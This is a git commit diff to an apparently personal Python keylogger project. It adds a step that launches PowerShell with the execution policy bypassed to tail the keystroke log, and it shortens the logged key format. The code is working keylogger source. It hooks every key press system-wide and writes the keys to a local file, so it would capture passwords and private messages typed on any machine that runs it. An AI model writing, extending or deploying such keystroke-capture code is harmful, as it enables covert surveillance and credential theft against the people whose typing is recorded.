87fec9d72528170cadcf042122cc4bca5b72f7cd
DamiennFl <damien.flutre@gmail.com>
2024-07-15 14:30:33 -0700

    output in powershell window

--- Python-Implementation/keylogger.py
+++ Python-Implementation/keylogger.py
@@ -1,4 +1,20 @@
+import subprocess
 import keyboard
+import os
+
+ps_script_path = r"C:\Users\damie\OneDrive\Documents\New folder (2)\Keylogger\Python-Implementation\open_and_tail.ps1"
+
+subprocess.Popen(
+    [
+        "powershell.exe",
+        "-NoExit",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-File",
+        ps_script_path,
+    ],
+    creationflags=subprocess.CREATE_NEW_CONSOLE,
+)
 
 file = open("output.txt", "w")
 
@@ -6,7 +22,6 @@ while True:
     # Wait for the next event.
     event = keyboard.read_event()
     if event.event_type == keyboard.KEY_DOWN:
-        file.write(f"Key pressed: {event.name}\n")
+        file.write(f"{event.name}\n")
     if event.event_type == keyboard.KEY_UP:
         file.flush()
-        print("Key pressed: ", event.name)
---
+++ Python-Implementation/open_and_tail.ps1
@@ -0,0 +1,2 @@
+$Host.UI.RawUI.WindowSize = New-Object Management.Automation.Host.Size (55, 20)
+Get-Content output.txt -Tail 10 -Wait
